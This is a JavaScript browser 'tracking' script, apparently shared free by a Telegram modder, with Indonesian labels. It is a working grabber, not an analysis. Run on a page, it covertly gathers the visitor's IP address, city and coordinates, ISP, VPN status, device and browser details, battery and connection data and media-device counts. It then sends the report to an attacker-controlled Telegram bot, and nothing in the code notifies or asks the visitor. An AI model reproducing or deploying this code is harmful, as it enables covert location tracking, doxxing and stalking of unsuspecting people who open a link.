// ==== TRACKING FREE VERSION V2.0 ==== //
// ==== TELEGRAM @Izalmodz ==== //
const startTracking = async () => {
    const formatWaktu = () => {
        return new Date().toLocaleString('id-ID', {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    };
    
    const sendToTelegram = async (text) => {
        return fetch(`https://api.telegram.org/bot${config.IzalmodzToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.IzalmodzId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    };
    
    const getLocationInfo = async () => {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city || 'Tidak diketahui',
                region: data.region || 'Tidak diketahui',
                country: data.country_name || 'Tidak diketahui',
                isp: data.org || 'Tidak diketahui',
                vpn: data.vpn || data.proxy ? 'Ya' : 'Tidak',
                latitude: data.latitude || 'Tidak diketahui',
                longitude: data.longitude || 'Tidak diketahui',
                timezone: data.timezone || 'Tidak diketahui'
            };
        } catch (e) {
            return {
                ip: 'Gagal mendapatkan',
                city: 'Gagal mendapatkan',
                region: 'Gagal mendapatkan',
                country: 'Gagal mendapatkan',
                isp: 'Gagal mendapatkan',
                vpn: 'Gagal mendapatkan',
                latitude: 'Gagal mendapatkan',
                longitude: 'Gagal mendapatkan',
                timezone: 'Gagal mendapatkan'
            };
        }
    };
    
    const getBatteryInfo = async () => {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return {
                level: Math.floor(battery.level * 100),
                charging: battery.charging ? 'Ya' : 'Tidak',
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        return null;
    };
    
    const getConnectionInfo = () => {
        if (navigator.connection) {
            return {
                effectiveType: navigator.connection.effectiveType || 'Tidak diketahui',
                downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'Tidak diketahui',
                rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'Tidak diketahui'
            };
        }
        return null;
    };
    
    const getDeviceInfo = () => {
        return {
            language: navigator.language || 'Tidak diketahui',
            languages: navigator.languages ? navigator.languages.join(', ') : 'Tidak diketahui',
            cookieEnabled: navigator.cookieEnabled ? 'Ya' : 'Tidak',
            javaEnabled: navigator.javaEnabled ? 'Ya' : 'Tidak',
            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ya' : 'Tidak'
        };
    };
    
    const getMediaDevices = async () => {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return {
                audioInput: devices.filter(d => d.kind === 'audioinput').length,
                videoInput: devices.filter(d => d.kind === 'videoinput').length,
                audioOutput: devices.filter(d => d.kind === 'audiooutput').length
            };
        } catch (e) {
            return {
                audioInput: 'Gagal mendapatkan',
                videoInput: 'Gagal mendapatkan',
                audioOutput: 'Gagal mendapatkan'
            };
        }
    };
    
    const locationInfo = await getLocationInfo();
    const batteryInfo = await getBatteryInfo();
    const connectionInfo = getConnectionInfo();
    const deviceInfo = getDeviceInfo();
    const mediaDevices = await getMediaDevices();
    
    const report = `
<pre>╭──────── HASIL TRACKING V2.0 ────────╮

📅 <b>Waktu:</b> ${formatWaktu()}

📱 <b>Informasi Perangkat:</b>
   • Platform: ${navigator.platform}
   • Browser: ${navigator.userAgent}
   • Ukuran Layar: ${screen.width}x${screen.height}
   • CPU Cores: ${navigator.hardwareConcurrency || 'Tidak diketahui'}
   • RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB
   • Touchscreen: ${'ontouchstart' in window ? 'Ya' : 'Tidak'}
   • Online: ${navigator.onLine ? 'Ya' : 'Tidak'}
   • Bahasa: ${deviceInfo.language}
   • Cookie Enabled: ${deviceInfo.cookieEnabled}
   • Java Enabled: ${deviceInfo.javaEnabled}
   • PDF Viewer Enabled: ${deviceInfo.pdfViewerEnabled}

🌐 <b>Informasi Jaringan:</b>
   • IP: ${locationInfo.ip}
   • Kota/Kab: ${locationInfo.city}
   • Provinsi: ${locationInfo.region}
   • Negara: ${locationInfo.country}
   • ISP: ${locationInfo.isp}
   • VPN/Proxy: ${locationInfo.vpn}
   • Latitude: ${locationInfo.latitude}
   • Longitude: ${locationInfo.longitude}
   • Zona Waktu: ${locationInfo.timezone}
   ${connectionInfo ? `
   • Tipe Koneksi: ${connectionInfo.effectiveType}
   • Kecepatan Downlink: ${connectionInfo.downlink}
   • RTT: ${connectionInfo.rtt}
   ` : ''}

🔋 <b>Informasi Baterai:</b>
   ${batteryInfo ? `
   • Level: ${batteryInfo.level}%
   • Sedang Dicharge: ${batteryInfo.charging}
   ` : 'Tidak tersedia'}

🎤 <b>Perangkat Media:</b>
   • Input Audio: ${mediaDevices.audioInput}
   • Input Video: ${mediaDevices.videoInput}
   • Output Audio: ${mediaDevices.audioOutput}

╰───────── DEVELOPER @Izalmodz ─────────╯</pre>

<blockquote>INFO UPDATE: <a href="https://t.me/+toDQtab6PsZiM2M9">DISINI BANG</a>
NOTE: TRACKING INI FREE, JIKA ADA YANG MENJUAL SEGERA HUBUNGI DEVELOPER</blockquote>
    `;
    
    await sendToTelegram(report);
};

window.startTracking = startTracking;